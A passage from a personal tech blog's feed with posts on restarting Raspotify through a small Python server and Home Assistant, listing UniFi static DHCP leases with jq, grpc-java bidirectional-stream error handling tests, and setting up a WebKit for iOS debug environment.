+<p>To solve this, I wrote a small API server in Python to restart Raspotify once I want to turn it off (when motion sensor turns off).</p>
+
+<p>Start by creating a <code class="language-plaintext highlighter-rouge">~/watchdog</code> directory and placing the following content in <code class="language-plaintext highlighter-rouge">~/watchdog/server.py</code> (<strong>replace <code class="language-plaintext highlighter-rouge">&lt;Secret Restart Password QueryString&gt;</code> with some long string that should be kept secret</strong>):</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
+<span class="kn">from</span> <span class="n">http.server</span> <span class="kn">import</span> <span class="n">HTTPServer</span><span class="p">,</span> <span class="n">BaseHTTPRequestHandler</span>
+
+<span class="k">class</span> <span class="nc">MyHandler</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">path</span> <span class="o">!=</span> <span class="sh">"</span><span class="s">/?&lt;Secret Restart Password QueryString&gt;</span><span class="sh">"</span><span class="p">:</span>
+            <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">401</span><span class="p">)</span>
+            <span class="n">self</span><span class="p">.</span><span class="nf">end_headers</span><span class="p">()</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nf">bytes</span><span class="p">(</span><span class="sh">"</span><span class="s">Bye bye</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">))</span>
+            <span class="k">return</span>
+        <span class="c1"># send 200 response
+</span>        <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+        <span class="c1"># send response headers
+</span>        <span class="n">self</span><span class="p">.</span><span class="nf">end_headers</span><span class="p">()</span>
+        <span class="c1"># send the body of the response
+</span>        <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">sudo systemctl restart raspotify.service</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nf">bytes</span><span class="p">(</span><span class="sh">"</span><span class="s">Restarted</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">))</span>
+
+<span class="n">httpd</span> <span class="o">=</span> <span class="nc">HTTPServer</span><span class="p">((</span><span class="sh">''</span><span class="p">,</span> <span class="mi">9876</span><span class="p">),</span> <span class="n">MyHandler</span><span class="p">)</span>
+<span class="n">httpd</span><span class="p">.</span><span class="nf">serve_forever</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Then create the file <code class="language-plaintext highlighter-rouge">/lib/systemd/system/restart_raspotify.service</code> with the following content:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Unit]
+Description=Restart raspotify service
+After=multi-user.target
+Conflicts=getty@tty1.service
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/python3 /home/pi/watchdog/server.py
+StandardInput=tty-force
+
+[Install]
+WantedBy=multi-user.target
+</code></pre></div></div>
+
+<p>To enable the newly created service, run:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systemctl <span class="nb">enable </span>restart_raspotify.service
+systemctl start restart_raspotify.service
+</code></pre></div></div>
+
+<h3 id="spotcast-on-home-assistant">Spotcast on Home Assistant</h3>
+
+<p>Spotcast enables Home Assistant to play music on Spotify Connect-enabled devices, like our Raspotify system. Follow the <a href="https://github.com/fondberg/spotcast#installation">installation steps</a> to install on your Home Assistant instance. After installing, you need to configure Home Assistant to authenticate using your Spotify Premium account by following the <a href="https://github.com/fondberg/spotcast#configuration">configuration steps</a>.</p>
+
+<p>After restarting Home Assistant, you’ll be able to use Spotcast to play music on your speaker through Raspotify by calling this Home Assistant service (<strong>replace <code class="language-plaintext highlighter-rouge">&lt;Speaker Name&gt;</code> with what you specified in <code class="language-plaintext highlighter-rouge">/etc/default/raspotify</code>, and <code class="language-plaintext highlighter-rouge">&lt;Spotify Playlist URI&gt;</code> with the Spotify-formatted URI such as <code class="language-plaintext highlighter-rouge">spotify:album:2PPfl28ysMbOkl2DBJ5Dr4</code> - a good rainforest nature album</strong>):</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">data</span><span class="pi">:</span>
+  <span class="na">device_name</span><span class="pi">:</span> <span class="s2">"</span><span class="s">&lt;Speaker</span><span class="nv"> </span><span class="s">Name&gt;"</span>
+  <span class="na">random_song</span><span class="pi">:</span> <span class="kc">true</span>
+  <span class="na">uri</span><span class="pi">:</span> <span class="s2">"</span><span class="s">&lt;Spotify</span><span class="nv"> </span><span class="s">Playlist</span><span class="nv"> </span><span class="s">URI&gt;"</span>
+  <span class="na">start_volume</span><span class="pi">:</span> <span class="m">15</span>
+  <span class="na">force_playback</span><span class="pi">:</span> <span class="kc">true</span>
+<span class="na">service</span><span class="pi">:</span> <span class="s">spotcast.start</span>
+</code></pre></div></div>
+
+<h3 id="raspotify-restart-via-home-assistant">Raspotify Restart via Home Assistant</h3>
+
+<p>Edit Home Assistant’s <code class="language-plaintext highlighter-rouge">configuration.yaml</code> file (by <a href="https://www.home-assistant.io/getting-started/configuration/">installing the File Editor</a> or by any other method) and insert the following to the configuration (<strong>replace &lt;Secret Restart Password QueryString&gt; with what you chose in <code class="language-plaintext highlighter-rouge">~/watchdog/server.py</code></strong>):</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">rest_command</span><span class="pi">:</span>
+  <span class="na">restart_raspotify</span><span class="pi">:</span>
+    <span class="na">url</span><span class="pi">:</span> <span class="s2">"</span><span class="s">http://&lt;Raspberry</span><span class="nv"> </span><span class="s">Pi</span><span class="nv"> </span><span class="s">IP&gt;:9876/?&lt;Secret</span><span class="nv"> </span><span class="s">Restart</span><span class="nv"> </span><span class="s">Password</span><span class="nv"> </span><span class="s">QueryString&gt;"</span>
+</code></pre></div></div>
+
+<p>After another Home Assistant restart, you’ll be able to invoke the following service to restart Raspotify and make it re-authenticate using the configured credentials:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">service</span><span class="pi">:</span> <span class="s">rest_command.restart_raspotify</span>
+</code></pre></div></div>
+
+<h3 id="connecting-it-all-together-in-home-assistant">Connecting It All Together in Home Assistant</h3>
+
+<p>I configured an automation to trigger when the motion sensor is activated - it will play the rainforest nature album (<code class="language-plaintext highlighter-rouge">spotify:album:2PPfl28ysMbOkl2DBJ5Dr4</code>). When the motion sensor is deactivated - it runs restart_raspotify to reset Raspotify to the configured credentials and be ready for the next person to walk in.</p>
+
+<p>If anyone wants the full Home Assistant setup, write a comment and I’ll upload that as well.</p>
+
+<h3 id="adding-airplay-support">Adding AirPlay Support</h3>
+
+<p>Follow the instructions in the <a href="https://lewin.co.il/bathroom-smart-speaker-part-2-airplay-to-bluetooth-speaker-via-raspberry-pi/">follow-up post</a>.</p>
+
+<h2 id="bonus---turning-ue-boom-on-via-raspberry-pi">Bonus - Turning UE Boom On via Raspberry Pi</h2>
+
+<p>UE Boom is listening for Bluetooth commands even when turned off. You can use your phone (if paired with the speaker) to turn the speaker on remotely. You can do the same with Raspberry Pi after it’s connected. To do so, first install NodeJS (I chose version 14.15.4 while writing this, there’s probably a newer version available when you’re reading this). There’s no official NodeJS release for Raspberry Pi Zero W, but this unofficial installation works great for me:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nb">export </span><span class="nv">NODE_VER</span><span class="o">=</span>14.15.4
+<span class="k">if</span> <span class="o">!</span> node <span class="nt">--version</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="k">${</span><span class="nv">NODE_VER</span><span class="k">}</span><span class="p">;</span> <span class="k">then</span>
+  <span class="o">(</span><span class="nb">cat</span> /proc/cpuinfo | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"Pi Zero"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-d</span> node-v<span class="k">${</span><span class="nv">NODE_VER</span><span class="k">}</span><span class="nt">-linux-armv6l</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"Installing nodejs </span><span class="k">${</span><span class="nv">NODE_VER</span><span class="k">}</span><span class="s2"> for armv6 from unofficial builds..."</span>
+    curl <span class="nt">-O</span> https://unofficial-builds.nodejs.org/download/release/v<span class="k">${</span><span class="nv">NODE_VER</span><span class="k">}</span>/node-v<span class="k">${</span><span class="nv">NODE_VER</span><span class="k">}</span><span class="nt">-linux-armv6l</span>.tar.xz
+    <span class="nb">tar</span> <span class="nt">-xf</span> node-v<span class="k">${</span><span class="nv">NODE_VER</span><span class="k">}</span><span class="nt">-linux-armv6l</span>.tar.xz
+  <span class="k">fi
+  </span><span class="nb">echo</span> <span class="s2">"Adding node to the PATH"</span>
+  <span class="nv">PATH</span><span class="o">=</span><span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>/node-v<span class="k">${</span><span class="nv">NODE_VER</span><span class="k">}</span><span class="nt">-linux-armv6l</span>/bin:<span class="k">${</span><span class="nv">PATH</span><span class="k">}</span>
+<span class="k">fi</span>
+</code></pre></div></div>
+
+<p>After installing NodeJS, run the following script whenever you want to turn your UE Boom on. <strong>Make sure you replace 00:11:22:33:44:55 with your UE Boom’s Bluetooth MAC address, and AABBCCDDEEFF to your Raspberry Pi Zero W’s Bluetooth MAC address, the same client address you used for pairing.</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+
+<span class="nb">set</span> <span class="nt">-ue</span>
+
+<span class="nv">HANDLE</span><span class="o">=</span>0x0003
+<span class="nv">VALUE</span><span class="o">=</span>AABBCCDDEEFF01
+
+<span class="nv">MAC</span><span class="o">=</span>00:11:22:33:44:55
+
+gatttool <span class="nt">-b</span> <span class="nv">$MAC</span> <span class="nt">--char-write-req</span> <span class="nt">--handle</span><span class="o">=</span><span class="nv">$HANDLE</span> <span class="nt">--value</span><span class="o">=</span><span class="nv">$VALUE</span>
+</code></pre></div></div>]]></content><author><name>Guy Lewin</name></author><category term="home assistant" /><category term="pi-btaudio" /><category term="raspberry pi" /><category term="raspotify" /><category term="spotcast" /><category term="spotify" /><category term="ue boom" /><summary type="html"><![CDATA[Goal]]></summary></entry><entry><title type="html">UniFi Static IP Leases</title><link href="https://lewin.co.il/2021/07/11/unifi-static-ip-leases.html" rel="alternate" type="text/html" title="UniFi Static IP Leases" /><published>2021-07-11T19:51:56+00:00</published><updated>2021-07-11T19:51:56+00:00</updated><id>https://lewin.co.il/2021/07/11/unifi-static-ip-leases</id><content type="html" xml:base="https://lewin.co.il/2021/07/11/unifi-static-ip-leases.html"><![CDATA[<p>In order to organize my UniFi-controlled network, I tried to look at all the static IP allocations I made using the UniFi portal.</p>
+
+<p>Some lookups online suggested I use the “Insights” page on the UniFi portal, but I get a “No WiFi Networks found” error when I do:</p>
+
+<p><img src="/assets/images/posts/unifi-static-ip-leases/1.png" alt="" /></p>
+
+<p>I figured there’s a way to get the info through SSHing into the machine itself. Running <code class="language-plaintext highlighter-rouge">grep</code> recursively throughout the filesystem made me find <code class="language-plaintext highlighter-rouge">/config/ubios-udapi-server/ubios-udapi-server.state</code> which is a large JSON file containing device configuration. The DHCP static leases were listed under <code class="language-plaintext highlighter-rouge">services</code> -&gt; <code class="language-plaintext highlighter-rouge">dhcpServers</code> -&gt; <code class="language-plaintext highlighter-rouge">staticLeases</code>. I wrote this small one-liner to retrieve the mapping as JSON array:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /config/ubios-udapi-server/ubios-udapi-server.state | jq <span class="s1">'[.services.dhcpServers[0].staticLeases[] | {ip: .addresses[0], mac: .id}] | sort_by(.ip | split(".") | map(tonumber))'</span>
+</code></pre></div></div>
+
+<p>The output of this script is a JSON array of objects containing <code class="language-plaintext highlighter-rouge">ip</code> and <code class="language-plaintext highlighter-rouge">mac</code>, for example:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="w">
+  </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"ip"</span><span class="p">:</span><span class="w"> </span><span class="s2">"192.168.1.2"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"mac"</span><span class="p">:</span><span class="w"> </span><span class="s2">"00:11:22:33:44:55"</span><span class="w">
+  </span><span class="p">},</span><span class="w">
+  </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"ip"</span><span class="p">:</span><span class="w"> </span><span class="s2">"192.168.1.3"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"mac"</span><span class="p">:</span><span class="w"> </span><span class="s2">"aa:bb:cc:dd:ee:ff"</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">]</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Eventually I learned that the old UniFi network UI has a working Insights page containing all the static leases. In order to view this page, I had to go to the “System Settings” tab within the Network settings page and disable “New User Interface”:</p>
+
+<p><img src="/assets/images/posts/unifi-static-ip-leases/2.png" alt="" /></p>
+
+<p>Once I did that, I could visit the old Insights page and select the following filters to view all assigned static IP leases:</p>
+
+<p><img src="/assets/images/posts/unifi-static-ip-leases/3.png" alt="" /></p>]]></content><author><name>Guy Lewin</name></author><category term="dhcp" /><category term="ip" /><category term="jq" /><category term="ssh" /><category term="static" /><category term="ubiquiti" /><category term="unifi" /><summary type="html"><![CDATA[In order to organize my UniFi-controlled network, I tried to look at all the static IP allocations I made using the UniFi portal.]]></summary></entry><entry><title type="html">Inconsistencies in grpc-java Error Handling with Bidirectional Streams</title><link href="https://lewin.co.il/2020/10/27/inconsistencies-in-grpc-java-error-handling-with-bidirectional-streams.html" rel="alternate" type="text/html" title="Inconsistencies in grpc-java Error Handling with Bidirectional Streams" /><published>2020-10-27T02:37:59+00:00</published><updated>2020-10-27T02:37:59+00:00</updated><id>https://lewin.co.il/2020/10/27/inconsistencies-in-grpc-java-error-handling-with-bidirectional-streams</id><content type="html" xml:base="https://lewin.co.il/2020/10/27/inconsistencies-in-grpc-java-error-handling-with-bidirectional-streams.html"><![CDATA[<p>While working on a <a href="https://github.com/grpc/grpc-java">grpc-java</a> project with <a href="https://grpc.io/docs/languages/java/basics/#bidirectional-streaming-rpc">bidirectional streaming</a> I noticed lack of documentation on how to handle errors. I wanted to know when are errors thrown, and how should an error be handled after receiving one.</p>
+
+<p>Since I could barely find any documentation online, I constructed a few tests of my own. I arranged a small project with a bidirectional gRPC service, and configured <a href="https://junit.org/">JUnit</a> to perform a successful handshake over the loopback between a client and a server before each test. I was using the most recent version of <code class="language-plaintext highlighter-rouge">grpc-java</code> (while writing this post) - <code class="language-plaintext highlighter-rouge">1.33.0</code>. There are 4 <code class="language-plaintext highlighter-rouge">StreamObserver</code> objects in all the tests:</p>
+
+<ul>
+  <li>Client Request - Implemented by <code class="language-plaintext highlighter-rouge">grpc-java</code>, calling its <code class="language-plaintext highlighter-rouge">onNext()</code>, <code class="language-plaintext highlighter-rouge">onError()</code> and <code class="language-plaintext highlighter-rouge">onCompleted()</code> should trigger the appropriate Server Request <code class="language-plaintext highlighter-rouge">StreamObserver</code> object over the network.</li>
+  <li>Client Response - Implemented by me, receiving triggers from Server Response <code class="language-plaintext highlighter-rouge">StreamObserver</code> object over the network.</li>
+  <li>Server Request - Implemented by me, receiving triggers from Client Response <code class="language-plaintext highlighter-rouge">StreamObserver</code> object over the network.</li>
+  <li>Server Response - Implemented by <code class="language-plaintext highlighter-rouge">grpc-java</code>, calling its <code class="language-plaintext highlighter-rouge">onNext()</code>, <code class="language-plaintext highlighter-rouge">onError()</code> and <code class="language-plaintext highlighter-rouge">onCompleted()</code> should trigger the appropriate Client Response <code class="language-plaintext highlighter-rouge">StreamObserver</code> object over the network.</li>
+</ul>
+
+<p>In the first group of tests - I wanted to check what <code class="language-plaintext highlighter-rouge">onError()</code> callbacks are triggered on the <code class="language-plaintext highlighter-rouge">StreamObserver</code> objects when I call the 2 different <code class="language-plaintext highlighter-rouge">onError()</code> <code class="language-plaintext highlighter-rouge">grpc-java</code> implementations. The columns represent the <code class="language-plaintext highlighter-rouge">StreamObserver</code> the error was sent on (using <code class="language-plaintext highlighter-rouge">onError()</code>). The rows represent the StreamObserver error was checked on (also, using <code class="language-plaintext highlighter-rouge">onError()</code>):</p>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th><strong>Client Request</strong></th>
+      <th><strong>Server Response</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Server Request</strong></td>
+      <td><code class="language-plaintext highlighter-rouge">StatusRuntimeException("CANCELLED: client cancelled")</code>, <code class="language-plaintext highlighter-rouge">cause</code> is <code class="language-plaintext highlighter-rouge">null</code>.</td>
+      <td><code class="language-plaintext highlighter-rouge">onError()</code> not triggered</td>
+    </tr>
+    <tr>
+      <td><strong>Client Response</strong></td>
+      <td><code class="language-plaintext highlighter-rouge">StatusRuntimeException("CANCELLED: Cancelled by client with StreamObserver.onError()")</code>, original exception included as <code class="language-plaintext highlighter-rouge">cause</code>.</td>
+      <td><code class="language-plaintext highlighter-rouge">StatusRuntimeException("UNKNOWN")</code>, <code class="language-plaintext highlighter-rouge">cause</code> is <code class="language-plaintext highlighter-rouge">null</code>.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>(Columns represent the StreamObserver the error was sent on. Rows represent the StreamObserver error was checked on)</p>
+
+<p>As you can see - the results are very confusing. Each scenario behaved differently, especially in Server Response <code class="language-plaintext highlighter-rouge">StreamObserver</code> object where <code class="language-plaintext highlighter-rouge">onError()</code> wasn’t even called when the error was sent from the Server Request object. This proves it is wrong to rely on <code class="language-plaintext highlighter-rouge">onError()</code> always being called on both sides when an error is sent.</p>
+
+<p>The test above showed us when and how <code class="language-plaintext highlighter-rouge">onError()</code> is being triggered on listening <code class="language-plaintext highlighter-rouge">StreamObserver</code> objects. But what can (and should) you do with a such object after receiving an error? Should you call <code class="language-plaintext highlighter-rouge">onCompleted()</code> manually? Should you call <code class="language-plaintext highlighter-rouge">onError()</code> on the corresponding side of the <code class="language-plaintext highlighter-rouge">StreamObserver</code>?</p>
+
+<p>According to <a href="https://grpc.github.io/grpc-java/javadoc/io/grpc/stub/StreamObserver.html">grpc-java’s StreamObserver documentation</a>, <code class="language-plaintext highlighter-rouge">onError()</code> and <code class="language-plaintext highlighter-rouge">onCompleted()</code> should only be called once and should be the last methods called on an instance. But does that apply if it was called by gRPC over the network? I performed some tests by calling <code class="language-plaintext highlighter-rouge">onNext()</code> and <code class="language-plaintext highlighter-rouge">onComplete()</code> after throwing errors. These are the results:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th><strong>Client Request</strong></th>
+      <th><strong>Server Response</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Client Request - onNext</strong></td>
+      <td><code class="language-plaintext highlighter-rouge">IllegalStateException</code></td>
+      <td>No exception</td>
+    </tr>
+    <tr>
+      <td><strong>Client Request - onCompleted</strong></td>
+      <td><code class="language-plaintext highlighter-rouge">IllegalStateException</code></td>
+      <td>No exception</td>
+    </tr>
+    <tr>
+      <td><strong>Server Response - onNext</strong></td>
+      <td><code class="language-plaintext highlighter-rouge">StatusRuntimeException</code></td>
+      <td><code class="language-plaintext highlighter-rouge">IllegalStateException</code></td>
+    </tr>
+    <tr>
+      <td><strong>Server Response - onCompleted</strong></td>
+      <td>No exception</td>
+      <td><code class="language-plaintext highlighter-rouge">IllegalStateException</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>(Columns represent the StreamObserver the error was sent on. Rows represent the message sent after the error)</p>
+
+<p>Once again there are inconsistencies in how gRPC notifies us on the error. It seems like it’s wrong to use the stream after an error was thrown in any way, but only in some cases an exception is thrown back to the caller of <code class="language-plaintext highlighter-rouge">onNext()</code> or <code class="language-plaintext highlighter-rouge">onCompleted()</code>. I was bothered to see that calling <code class="language-plaintext highlighter-rouge">onNext()</code> and <code class="language-plaintext highlighter-rouge">onCompleted()</code> on a Server Response <code class="language-plaintext highlighter-rouge">StreamObserver</code> object after receiving an error from Client Request side didn’t result in the same exception.</p>
+
+<p>In conclusion, based on the tests I performed it appears that:</p>
+
+<ul>
+  <li>Sending errors from the client to the server will always call <code class="language-plaintext highlighter-rouge">onError()</code> on all <code class="language-plaintext highlighter-rouge">StreamObserver</code> objects, with informative errors. The other way around isn’t as robust.</li>
+  <li>Streams shouldn’t be used after an error was received, not even to call <code class="language-plaintext highlighter-rouge">onCompleted()</code>. gRPC sometimes throws exceptions when calling methods on closed streams.</li>
+</ul>
+
+<p>The GitHub repository with all of my tests can be found <a href="https://github.com/GuyLewin/grpc-bidirectional-streaming-error-handling">here</a>.</p>]]></content><author><name>Guy Lewin</name></author><category term="bidirectional" /><category term="grpc" /><category term="grpc-java" /><category term="oncompleted" /><category term="onerror" /><category term="statusruntimeexception" /><category term="stream" /><category term="streamobserver" /><summary type="html"><![CDATA[While working on a grpc-java project with bidirectional streaming I noticed lack of documentation on how to handle errors. I wanted to know when are errors thrown, and how should an error be handled after receiving one.]]></summary></entry><entry><title type="html">Debugging WebKit for iOS</title><link href="https://lewin.co.il/2019/03/16/debugging-webkit-for-ios.html" rel="alternate" type="text/html" title="Debugging WebKit for iOS" /><published>2019-03-16T15:24:44+00:00</published><updated>2019-03-16T15:24:44+00:00</updated><id>https://lewin.co.il/2019/03/16/debugging-webkit-for-ios</id><content type="html" xml:base="https://lewin.co.il/2019/03/16/debugging-webkit-for-ios.html"><![CDATA[<p>I found a <a href="https://bugs.webkit.org/show_bug.cgi?id=195537">bug in WebKit for iOS</a> and wanted to setup a debug environment to find the exact relevant line. This was harder than I thought, so I decided to document the process.</p>
+
+<h2 id="collect-initial-crash-dump">Collect Initial Crash Dump</h2>
+
+<p>I noticed after running the crashing JavaScript code, I got prompted with a “This webpage was reloaded because a problem occurred.” error. I went and checked <em>Settings &gt; Privacy &gt; Analytics &gt; Analytics Data</em> and found a <em>com.apple.WebKit.WebContent</em> entry with the following crash information:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+Exception Type:  EXC_BAD_ACCESS (SIGSEGV)
+Exception Subtype: KERN_INVALID_ADDRESS at 0x0000000000000000
+VM Region Info: 0 is not in any region.  Bytes before following region: 4372119552
+      REGION TYPE                      START - END             [ VSIZE] PRT/MAX SHRMOD  REGION DETAIL
+      UNUSED SPACE AT START
+---&gt;  
+      __TEXT                 0000000104994000-0000000104998000 [   16K] r-x/r-x SM=COW  ...it.WebContent
+
+Termination Signal: Segmentation fault: 11
+Termination Reason: Namespace SIGNAL, Code 0xb
+Terminating Process: exc handler [30816]
+Triggered by Thread:  0
+
+Thread 0 name:  Dispatch queue: com.apple.main-thread
+Thread 0 Crashed:
+0   WebCore                       	0x00000001b0225e78 0x1aef42000 + 19807864
+1   WebCore                       	0x00000001af51f158 0x1aef42000 + 6148440
+2   WebCore                       	0x00000001b039bcf8 0x1aef42000 + 21339384
+3   WebCore                       	0x00000001b0322a50 0x1aef42000 + 20843088
+4   WebCore                       	0x00000001b03927c4 0x1aef42000 + 21301188
+5   WebCore                       	0x00000001b03099cc 0x1aef42000 + 20740556
+6   WebCore                       	0x00000001b0310034 0x1aef42000 + 20766772
+7   WebCore                       	0x00000001b048e35c 0x1aef42000 + 22332252
+8   WebCore                       	0x00000001b040d8ec 0x1aef42000 + 21805292
+9   WebCore                       	0x00000001b032325c 0x1aef42000 + 20845148
+10  WebCore                       	0x00000001b0322a50 0x1aef42000 + 20843088
+11  WebCore                       	0x00000001b0322f28 0x1aef42000 + 20844328
+12  WebCore                       	0x00000001b0322bdc 0x1aef42000 + 20843484
+13  WebCore                       	0x00000001b0323294 0x1aef42000 + 20845204
+14  WebCore                       	0x00000001b0322a50 0x1aef42000 + 20843088
+15  WebCore                       	0x00000001b0322f28 0x1aef42000 + 20844328
+16  WebCore                       	0x00000001b0322bdc 0x1aef42000 + 20843484
+17  WebCore                       	0x00000001b0323294 0x1aef42000 + 20845204
+18  WebCore                       	0x00000001b0322a50 0x1aef42000 + 20843088
+19  WebCore                       	0x00000001b03e6e0c 0x1aef42000 + 21646860
+20  WebCore                       	0x00000001b03e4944 0x1aef42000 + 21637444
+21  WebCore                       	0x00000001b03e202c 0x1aef42000 + 21626924
+22  WebCore                       	0x00000001b03e1ff4 0x1aef42000 + 21626868
+23  WebCore                       	0x00000001b03dfe84 0x1aef42000 + 21618308
+24  WebCore                       	0x00000001b00bb610 0x1aef42000 + 18322960
+25  WebCore                       	0x00000001b015b8e8 0x1aef42000 + 18979048
+26  WebCore                       	0x00000001b00bb354 0x1aef42000 + 18322260
+27  WebKit                        	0x00000001b629b134 0x1b6135000 + 1466676
+28  WebKit                        	0x00000001b629c814 0x1b6135000 + 1472532
+29  WebKit                        	0x00000001b61f1430 0x1b6135000 + 771120
+30  WebCore                       	0x00000001b016734c 0x1aef42000 + 19026764
+31  WebCore                       	0x00000001b0150c5c 0x1aef42000 + 18934876
+32  WebCore                       	0x00000001b01ab680 0x1aef42000 + 19306112
+33  CoreFoundation                	0x00000001a63e0b80 0x1a6330000 + 723840
+34  CoreFoundation                	0x00000001a63e08ac 0x1a6330000 + 723116
+35  CoreFoundation                	0x00000001a63e0090 0x1a6330000 + 721040
+36  CoreFoundation                	0x00000001a63dad28 0x1a6330000 + 699688
+37  CoreFoundation                	0x00000001a63da2e8 0x1a6330000 + 697064
+38  Foundation                    	0x00000001a6dde3e0 0x1a6dd6000 + 33760
+39  Foundation                    	0x00000001a6e1b1cc 0x1a6dd6000 + 283084
+40  libxpc.dylib                  	0x00000001a6099d10 0x1a6085000 + 85264
+41  libxpc.dylib                  	0x00000001a609c7a8 0x1a6085000 + 96168
+42  com.apple.WebKit.WebContent   	0x00000001049976b4 0x104994000 + 14004
+43  libdyld.dylib                 	0x00000001a5e8d050 0x1a5e8c000 + 4176
+...
+</code></pre></div></div>
+
+<p>It’s clear that this is a null dereference scenario, but finding the bug in the code out of this dump would be a nightmare. So I decided to setup my WebKit for iOS environment.</p>
+
+<h2 id="system-prerequisites">System Prerequisites</h2>
+
+<p>You have to have:</p>
+
+<ul>
+  <li>Recent Xcode with iPhone SDK</li>
+  <li><a href="https://www.macworld.co.uk/how-to/mac/how-turn-off-mac-os-x-system-integrity-protection-rootless-3638975/">Disable SIP</a>!
+    <ul>
+      <li>I couldn’t tell you how much time I wasted on this one. It was unclear to me that SIP on the Mac host machine would affect attaching to Safari / WebKit <strong>inside</strong> the iPhone simulator. Before disabling SIP I kept getting <em>error: attach failed: unable to attach</em> from lldb, and <em>Could not attach to pid (unable to attach)</em> trying to attach from Xcode. <strong>Disable SIP solved the debugger attaching errors</strong></li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="get-the-code">Get the Code</h2>
+
+<p>Generally just follow <a href="https://webkit.org/getting-the-code/">the Webkit guide for getting the code</a>. All you have to run is:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svn checkout https://svn.webkit.org/repository/webkit/trunk WebKit
+</code></pre></div></div>
+
+<p>This will checkout the up-to-date code version, which is probably not very stable. Try updating it once in a while if it’s not stable until you reach a stable enough version using the SVN update command from within the WebKit directory:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svn up
+</code></pre></div></div>
+
+<h2 id="compiling--running-webkit-for-ios">Compiling + Running WebKit for iOS</h2>
+
+<p>All iOS browsers (including Safari, Chrome, Opera, Firefox..) must use the pre-installed iOS WebKit version to get approved into the App Store. The browser used for debugging the WebKit engine on iOS is Safari and there are automated scripts ready to compile and launch everything for you. Simply follow <a href="https://webkit.org/blog/3457/building-webkit-for-ios-simulator/">this guide</a> from the WebKit blog. (Be sure to pass <code class="language-plaintext highlighter-rouge">--ios-simulator --debug</code> to every WebKit script you are running)</p>
+
+<h2 id="better-crash-logs">Better Crash Logs</h2>
+
+<p>Now that you have a running Safari with debug symbols - reproduce the crash. If you manage to get the browser to crash with the “This webpage was reloaded because a problem occurred.” message - look at the <code class="language-plaintext highlighter-rouge">~/Library/Logs/DiagnosticReports/</code> directory on your Mac and check if a log was recently created. It’s file name should end with your Mac’s name and not with the iPhone, which could be a bit confusing. Open the crash dump and you should be able to read it much clearly:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+Exception Type:        EXC_BAD_ACCESS (SIGSEGV)
+Exception Codes:       KERN_INVALID_ADDRESS at 0x0000000000000000
+Exception Note:        EXC_CORPSE_NOTIFY
+
+Termination Signal:    Segmentation fault: 11
+Termination Reason:    Namespace SIGNAL, Code 0xb
+Terminating Process:   exc handler [64527]
+
+VM Regions Near 0:
+--&gt; 
+    __TEXT                 0000000108332000-0000000108334000 [    8K] r-x/rwx SM=COW  /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/Library/CoreSimulator/Profiles/Runtimes/iOS.simruntime/Contents/Resources/RuntimeRoot/System/Library/Frameworks/WebKit.framework/XPCServices/com.apple.WebKit.WebContent.xpc/com.apple.WebKit.WebContent
